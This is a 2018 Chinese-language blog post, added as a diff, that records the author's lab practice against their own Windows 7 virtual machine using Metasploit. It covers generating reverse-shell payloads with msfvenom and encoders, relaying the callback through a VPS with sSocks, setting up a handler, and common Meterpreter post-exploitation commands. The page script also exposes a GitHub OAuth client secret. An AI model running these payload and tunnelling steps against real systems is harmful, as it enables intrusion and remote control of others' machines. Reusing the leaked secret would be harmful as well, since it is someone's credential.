@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+        <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+    <title>
+        
+            内网穿透进行Metasploit渗透
+        
+    </title>
+    <link rel="icon" href="/img/favicon.png">
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <link rel="stylesheet" href="/css/hljs.min.css">
+    <script src="/js/hljs.min.js"></script>  
+    <script src="/js/gitment.browser.js"></script>  
+</head>
+<body>
+    <header class="header" id="header">
+    <h1>
+        <a class="title" href="/">
+            Hpdoger
+        </a>
+    </h1>
+    <h2>
+        <a class="motto">
+            Ponyo loves Sōsuke!
+        </a>
+    </h2>
+    <nav class="navbar">
+        <ul class="menu">
+            
+            
+                <li class="menu-item">
+                    <a href="/" class="menu-item-link">
+                        Home
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/archives/" class="menu-item-link">
+                        Archives
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/about/" class="menu-item-link">
+                        About
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="https://github.com/Hpd0ger" class="menu-item-link">
+                        Github
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/atom.xml" class="menu-item-link">
+                        RSS
+                    </a>
+                </li>
+            
+                
+            
+                
+                
+                <li class="menu-item">
+                    <a class="menu-item-link search">
+                        Search                   
+                        <i class="fa fa-long-arrow-right search-icon" aria-hidden="true"></i>
+                    </a>
+                        <input placeholder="Search..." class="search-input" style="display:none;border:none!important;" onkeydown="onEnter(event)" onkeypress="onEnter(event)">
+                </li>
+                
+        </ul>
+    </nav>
+</header>
+    <main class="main">
+        <article class="post">
+            <h1>
+                <a class="title" href="/2018/07/09/内网穿透进行Metasploit渗透/"> 
+                    内网穿透进行Metasploit渗透 
+                </a>
+            </h1>
+            <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2018-07-09   
+                </a>
+                
+                <a class="category">
+                    <i class="fa fa-th" aria-hidden="true"></i>  
+                </a>
+               
+                <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/渗透/">渗透</a></li></ul>
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Metasploit/">Metasploit</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/渗透/">渗透</a></li></ul>
+            </div>
+<div class="toc">
+  <ol class="toc-list"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#初识Metasploit"><span class="toc-list-text">初识Metasploit</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#Meterpreter中常用的Shell"><span class="toc-list-text">Meterpreter中常用的Shell</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#reverse-tcp"><span class="toc-list-text">reverse_tcp</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#reverse-http"><span class="toc-list-text">reverse_http</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#reverse-https"><span class="toc-list-text">reverse_https</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#bind-tcp"><span class="toc-list-text">bind_tcp</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#payload选择的三大要素如下："><span class="toc-list-text">payload选择的三大要素如下：</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#常用payload"><span class="toc-list-text">常用payload</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#自己的看法"><span class="toc-list-text">自己的看法</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#获取meterpreter会话"><span class="toc-list-text">获取meterpreter会话</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#VPS开启流量转发"><span class="toc-list-text">VPS开启流量转发</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#生成Payload"><span class="toc-list-text">生成Payload</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#Kali生成Payload-in-Linux"><span class="toc-list-text">Kali生成Payload in Linux</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#Kali生成Payload-in-Windows"><span class="toc-list-text">Kali生成Payload in Windows</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#Kali分步生成Payload"><span class="toc-list-text">Kali分步生成Payload</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#msf进行监听"><span class="toc-list-text">msf进行监听</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#靶机运行Payload"><span class="toc-list-text">靶机运行Payload</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#Meterpreter的常用命令"><span class="toc-list-text">Meterpreter的常用命令</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#基本命令"><span class="toc-list-text">基本命令</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#文件系统命令"><span class="toc-list-text">文件系统命令</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#网络命令"><span class="toc-list-text">网络命令</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#系统命令"><span class="toc-list-text">系统命令</span></a></li></ol></li></ol>
+</div>
+            <div class="content">
+                <h2 id="初识Metasploit"><a href="#初识Metasploit" class="headerlink" title="初识Metasploit"></a>初识Metasploit</h2><p>Metasploit项目是一个旨在提供安全漏洞信息计算机安全项目，是一个框架，常用于内网渗透。</p>
+<p>Meterpreter是Metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。使用它作为攻击载荷能够获得目标系统的一个Meterpretershell的链接。Meterpretershell作为渗透模块有很多有用的功能，比如添加一个用户、隐藏一些东西、打开shell、得到用户密码、上传下载远程主机的文件、运行cmd.exe、捕捉屏幕、得到远程控制权、捕获按键信息、清除应用程序、显示远程主机的系统信息、显示远程机器的网络接口和IP地址等信息。另外Meterpreter能够躲避入侵检测系统。在远程主机上隐藏自己,它不改变系统硬盘中的文件,因此HIDS[基于主机的入侵检测系统]很难对它做出响应。此外它在运行的时候系统时间是变化的,所以跟踪它或者终止它对于一个有经验的人也会变得非常困难。最后,Meterpreter还可以简化任务创建多个会话。可以来利用这些会话进行渗透。 </p>
+<h2 id="Meterpreter中常用的Shell"><a href="#Meterpreter中常用的Shell" class="headerlink" title="Meterpreter中常用的Shell"></a>Meterpreter中常用的Shell</h2><h3 id="reverse-tcp"><a href="#reverse-tcp" class="headerlink" title="reverse_tcp"></a>reverse_tcp</h3><p>这是一个基于TCP的反向shell</p>
+<h3 id="reverse-http"><a href="#reverse-http" class="headerlink" title="reverse_http"></a>reverse_http</h3><p>基于http方式的反向连接，在网速慢的情况下不稳定</p>
+<h3 id="reverse-https"><a href="#reverse-https" class="headerlink" title="reverse_https"></a>reverse_https</h3><p>基于https方式的反向连接，在网速慢的情况下不稳定。</p>
+<h3 id="bind-tcp"><a href="#bind-tcp" class="headerlink" title="bind_tcp"></a>bind_tcp</h3><p>这是一个基于TCP的正向连接shell，因为在内网跨网段时无法连接到attack的机器，所以在内网中经常会使用，不需要设置LHOST。</p>
+<h2 id="payload选择的三大要素如下："><a href="#payload选择的三大要素如下：" class="headerlink" title="payload选择的三大要素如下："></a>payload选择的三大要素如下：</h2><ul>
+<li>木马连接的方向</li>
+<li>目标操作系统及版本</li>
+<li>反弹的shell类型</li>
+</ul>
+<p>木马连接方向：<br>msf木马分为正向连接与反向连接，正向连接适合攻击机能给连接目标机的情况，反向连接使用目标机能连接攻击机的情况，这里所说的连接一般是指tcp的某个端口。因此在生成木马前，需要先判断当前环境，适合正向连接木马还是反向连接的木马。（可以使用nc工具测试）</p>
+<p>操作系统位数查看：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getconf LONG_BIT</span><br></pre></td></tr></table></figure>
+
+<h2 id="常用payload"><a href="#常用payload" class="headerlink" title="常用payload"></a>常用payload</h2><p>linux相关payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1 linux/x86/meterpreter/reverse_tcp</span><br><span class="line">2 linux/x86/meterpreter/bind_tcp</span><br><span class="line">3 linux/x86/shell_bind_tcp</span><br><span class="line">4 linux/x86/shell_reverse_tcp</span><br><span class="line">5 linux/x64/shell_reverse_tcp</span><br><span class="line">6 linux/x64/shell_bind_tcp</span><br></pre></td></tr></table></figure>
+
+<p>windows相关payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1 windows/meterpreter/reverse_tcp</span><br><span class="line">2 windows/meterpreter/bind_tcp</span><br><span class="line">3 windows/shell_reverse_tcp</span><br><span class="line">4 windows/shell_bind_tcp</span><br><span class="line">5 windows/x64/meterpreter/reverse_tcp</span><br><span class="line">6 windows/x64/meterpreter/bind_tcp</span><br><span class="line">7 windows/x64/shell_reverse_tcp</span><br><span class="line">8 windows/x64/shell_bind_tcp</span><br></pre></td></tr></table></figure>
+
+<p>payload具体参数含义:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">-p, --payload    &lt;payload&gt;       指定需要使用的payload(攻击荷载)</span><br><span class="line">-l, --list       [module_type]   列出指定模块的所有可用资源,模块类型包括: payloads, encoders, nops, all</span><br><span class="line">-n, --nopsled    &lt;length&gt;        为payload预先指定一个NOP滑动长度</span><br><span class="line">-f, --format     &lt;format&gt;        指定输出格式 (使用 --help-formats 来获取msf支持的输出格式列表)</span><br><span class="line">-e, --encoder    [encoder]       指定需要使用的encoder（编码器）</span><br><span class="line">-a, --arch       &lt;architecture&gt;  指定payload的目标架构</span><br><span class="line">    --platform   &lt;platform&gt;      指定payload的目标平台</span><br><span class="line">-s, --space      &lt;length&gt;        设定有效攻击荷载的最大长度</span><br><span class="line">-b, --bad-chars  &lt;list&gt;          设定规避字符集，比如: &amp;#039;\x00\xff&amp;#039;</span><br><span class="line">-i, --iterations &lt;count&gt;         指定payload的编码次数</span><br><span class="line">-c, --add-code   &lt;path&gt;          指定一个附加的win32 shellcode文件</span><br><span class="line">-x, --template   &lt;path&gt;          指定一个自定义的可执行文件作为模板</span><br><span class="line">-k, --keep                       保护模板程序的动作，注入的payload作为一个新的进程运行</span><br><span class="line">    --payload-options            列举payload的标准选项</span><br><span class="line">-o, --out   &lt;path&gt;               保存payload</span><br><span class="line">-v, --var-name &lt;name&gt;            指定一个自定义的变量，以确定输出格式</span><br><span class="line">    --shellest                   最小化生成payload</span><br><span class="line">-h, --help                       查看帮助选项</span><br><span class="line">    --help-formats               查看msf支持的输出格式列表</span><br></pre></td></tr></table></figure>
+
+<p>一个典型的msfvenom使用举例如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=[Attacker&apos;s IP] lport=7777 -f exe -o /tmp/my_payload.exe</span><br></pre></td></tr></table></figure>
+
+<h2 id="自己的看法"><a href="#自己的看法" class="headerlink" title="自己的看法"></a>自己的看法</h2><p>最近真的好忙…然后又在这里胡乱研究Metasploit，感觉后天实验班考核要凉凉…<br>背景：我有一台Kali的虚拟机，一台外网vps，想要渗透一台win7的虚拟机。目前还没有学到提权，只是会用msf生成反弹马，然后msf监听外网vps接收的数据。win7我虚拟机开了Nat进行转发，传上去了小马，菜刀连接上。</p>
+<p>因为我是内网的Kali，所以要进行内网穿透：<br>内网穿透，即NAT穿透，网络连接时术语，计算机是局域网内时，外网与内网的计算机节点需要连接通信，有时就会出现不支持内网穿透，就是说映射端口，能让外网的电脑找到处于内网的电脑，提高下载速度。不管是内网穿透还是其他类型的网络穿透，都是网络穿透的统一方法来研究和解决。</p>
+<p>首先我们为什么要内网穿透？因为我们的kali在内网，当木鸡（简称）执行我们msf生成的EXE木马时，它会把自己的Shell反弹出去，当然这个Shell不可能反弹到我们自己的内网。那么我们就需要有个外网的ip来监听这个Shell。当然，我们也可以用自己的外网ip来映射到kali上。但是一方面我觉得不安全，另一方面我觉得windows限制太多了，所以就利用我有的一台Centos7的VPS来当作这个跳板。时间不多了，开始记录一下目前的步骤：</p>
+<h2 id="获取meterpreter会话"><a href="#获取meterpreter会话" class="headerlink" title="获取meterpreter会话"></a>获取meterpreter会话</h2><h3 id="VPS开启流量转发"><a href="#VPS开启流量转发" class="headerlink" title="VPS开启流量转发"></a>VPS开启流量转发</h3><p>在网上看到有人说用lcx作为内网端口转发的工具，但是centos7好像编译环境不允许lcx，使用不起。用Ssocks搭建隧道，监听两个端口，7777用来接收来自受害者反弹的shell，7778将7777的流量转发出。下载sSocks，执行命令编译<code>./configure &amp;&amp; make</code>,进入src文件夹</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./rcsocks -l 7777 -p 7778</span><br></pre></td></tr></table></figure>
+
+<h2 id="生成Payload"><a href="#生成Payload" class="headerlink" title="生成Payload"></a>生成Payload</h2><h3 id="Kali生成Payload-in-Linux"><a href="#Kali生成Payload-in-Linux" class="headerlink" title="Kali生成Payload in Linux"></a>Kali生成Payload in Linux</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>
+
+<h3 id="Kali生成Payload-in-Windows"><a href="#Kali生成Payload-in-Windows" class="headerlink" title="Kali生成Payload in Windows"></a>Kali生成Payload in Windows</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>
+
+<h3 id="Kali分步生成Payload"><a href="#Kali分步生成Payload" class="headerlink" title="Kali分步生成Payload"></a>Kali分步生成Payload</h3><p>分步执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use payload/windows/meterpreter/reverse_tcp  #指定payload</span><br><span class="line">msf &gt; payload(reverse_tcp) &gt; set lhost xxxxx(外网Ip) #设置监听地址</span><br><span class="line">lhost =&gt; xxxxx(外网Ip) </span><br><span class="line">msf &gt; payload(reverse_tcp) &gt; set lport 7777(监听流量流入端口)</span><br><span class="line">lport =&gt; 6666</span><br><span class="line">msf &gt; payload(reverse_tcp) &gt; generate -b &apos;\x00\xff&apos; -t exe -e x86/shikata_ga_nai -i 5 -f /root/test.exe</span><br><span class="line">[*] Writing 73802 bytes to /root/test.exe...</span><br></pre></td></tr></table></figure>
+
+<h2 id="msf进行监听"><a href="#msf进行监听" class="headerlink" title="msf进行监听"></a>msf进行监听</h2><p>回到msf主界面：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; payload(reverse_tcp) &gt; back</span><br></pre></td></tr></table></figure>
+
+<p>运行监听模块：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br></pre></td></tr></table></figure>
+
+<p>设置接收的payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(handler) &gt; set payload windows/meterpreter/bind_tcp</span><br></pre></td></tr></table></figure>
+
+<p>设置vps监听的地址和转发的端口：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(handler) &gt; set rhost xxxx(外网Ip)</span><br><span class="line">rhost =&gt; xxxx(外网Ip)</span><br><span class="line">msf exploit(handler) &gt; set lport 7778</span><br><span class="line">lport =&gt; 7778</span><br><span class="line">msf exploit(handler) &gt; exploit</span><br><span class="line">[*] Started bind handler</span><br><span class="line">[*] Sending stage (957999 bytes) to xxxx(外网Ip)</span><br><span class="line">[*] Starting the payload handler...</span><br></pre></td></tr></table></figure>
+
+<h2 id="靶机运行Payload"><a href="#靶机运行Payload" class="headerlink" title="靶机运行Payload"></a>靶机运行Payload</h2><p>Linux下运行elf会提示没有权限，加权限：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chomd +x ./shell.elf</span><br></pre></td></tr></table></figure>
+
+<p>然后再运行就可以了</p>
+<h2 id="Meterpreter的常用命令"><a href="#Meterpreter的常用命令" class="headerlink" title="Meterpreter的常用命令"></a>Meterpreter的常用命令</h2><h3 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">background  # 让meterpreter处于后台模式  </span><br><span class="line">sessions -i index   # 与会话进行交互，index表示第一个session  </span><br><span class="line">quit  # 退出会话  </span><br><span class="line">shell # 获得控制台权限  </span><br><span class="line">irb # 开启ruby终端</span><br></pre></td></tr></table></figure>
+
+<h3 id="文件系统命令"><a href="#文件系统命令" class="headerlink" title="文件系统命令"></a>文件系统命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cat # 查看文件内容  </span><br><span class="line">getwd # 查看当前工作目录  </span><br><span class="line">upload  # 上传文件到目标机上  </span><br><span class="line">download # 下载文件到本机上  </span><br><span class="line">edit # 编辑文件  </span><br><span class="line">search  # 搜索文件</span><br></pre></td></tr></table></figure>
+
+<h3 id="网络命令"><a href="#网络命令" class="headerlink" title="网络命令"></a>网络命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ipconfig / ifconfig # 查看网络接口信息  </span><br><span class="line">portfwd  add -l 4444 -p 3389 -r 192.168.1.102 # 端口转发，本机监听4444，把目标机3389转到本机4444 </span><br><span class="line">rdesktop -u Administrator -p ichunqiu 127.0.0.1:4444 #然后使用rdesktop来连接，-u 用户名 -p 密码</span><br><span class="line">route # 获取路由表信息</span><br></pre></td></tr></table></figure>
+
+<h3 id="系统命令"><a href="#系统命令" class="headerlink" title="系统命令"></a>系统命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ps # 查看当前活跃进程 </span><br><span class="line">migrate pid # 将Meterpreter会话移植到进程数位pid的进程中 </span><br><span class="line">execute -H -i -f cmd.exe # 创建新进程cmd.exe，-H不可见，-i交互 </span><br><span class="line">getpid # 获取当前进程的pid </span><br><span class="line">kill pid # 杀死进程 </span><br><span class="line">getuid # 查看权限 </span><br><span class="line">sysinfo # 查看目标机系统信息，如机器名，操作系统等 </span><br><span class="line">shutdown # 关机</span><br></pre></td></tr></table></figure>
+
+<p>相关链接：<br><a href="http://www.itlnmp.com/373.html" target="_blank" rel="noopener">防火墙（firewalld）端口转发</a><br><a href="http://www.lxhsec.com/2017/11/02/msf/" target="_blank" rel="noopener">利用metasploit进行提权</a><br><a href="http://wyb0.com/posts/msf-simple-elevate-privileges/" target="_blank" rel="noopener">Metasploit简单提权</a><br><a href="http://sourceforge.net/projects/ssocks/" target="_blank" rel="noopener">sSocks下载</a><br><a href="http://www.freebuf.com/articles/system/12182.html" target="_blank" rel="noopener">Socks代理反弹突破内网</a></p>
+
+            </div>
+          
+           
+            <div class="copyright">
+                <div class="name">
+                    <a>Author:</a>
+                    <a>Sōsuke</a>
+                </div>
+                <div class="link">
+                    <a>Link:</a>
+                    <a class="permalink" href="https://hpdoger.cn/2018/07/09/内网穿透进行Metasploit渗透/">https://hpdoger.cn/2018/07/09/内网穿透进行Metasploit渗透/</a>
+                </div>
+                <div class="license">
+                    <a>Statement:</a>
+                    <a>All articles in this blog shall be licensed by CC BY-NC-SA 3.0 CN, unless otherwise stated. Please indicate the provenance!</a>
+                </div>
+            </div>
+            
+
+          
+
+
+</article>
+
+
+<div class="tip">
+<button class="tip-btn">
+    Tip
+</button>
+<div class="tip-img">
+<ul>
+    
+ 
+</ul>
+</div>
+</div>
+
+<div class="more">
+
+    <div class="prev">
+   <a href="/2018/07/14/HITCON CTF命令执行绕过/">  HITCON CTF命令执行绕过</a>
+    </div>
+
+<div></div>
+
+    <div class="next">
+    <a href="/2018/06/23/CTF中的Misc题目/"> CTF中的Misc题目 </a>
+    </div>
+    
+</div>
+
+<div class="bdsharebuttonbox">
+<a href="#" class="bds_weixin fa fa-weixin" data-cmd="weixin" title="分享到微信" style="color:#1cbd8f">
+</a>
+<a href="#" class="bds_tsina fa fa-weibo" data-cmd="tsina" title="分享到新浪微博" style="color:#ff6363">
+</a>
+<a href="#" class="bds_twi fa fa-twitter" data-cmd="twi" title="分享到Twitter" style="color:#00A7EB">
+</a>
+<a href="#" class="bds_fbook fa fa-facebook" data-cmd="fbook" title="分享到Facebook" style="color:#00A7EB">
+</a>
+</div>
+<script>
+window._bd_share_config={
+    "common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"1","bdSize":"16"},
+    "share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='../../../../../static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+ 
+<div id="comments"></div>
+
+<script>
+    var gitment = new Gitment({
+    id: "Mon Jul 09 2018 11:25:35 GMT+0800",
+    owner: "Hpd0ger",
+    repo: "Hpd0ger.github.io",
+    oauth: {
+      client_id:"8d83609a651e972e308d",
+      client_secret: "37e40c89a47e957f654e86f71c5caaccad0774de",
+    }
+  })
+  gitment.render('comments')
+</script>
+    </main>
+    <a class="not-found">not found!</a>
+    <div class="search-items">
+    </div>
+    <a href="#header" id="top" style="display:none">
+        <i class="fa fa-sort-asc fa-2x"></i>
+    </a>
+    <footer class="footer">
+    <div class="footer-copyright">©️2017
+    <a href="//github.com/Vevlins/toki" class="link" target="_blank">Toki</a>  by Vevlins
+    </div>
+</footer>
+
+    <script src="/js/jquery.js"></script>
+    <script src="/js/toki.js"></script>  
+  <script>hljs.initHighlightingOnLoad();</script>
+</body>
+</html>
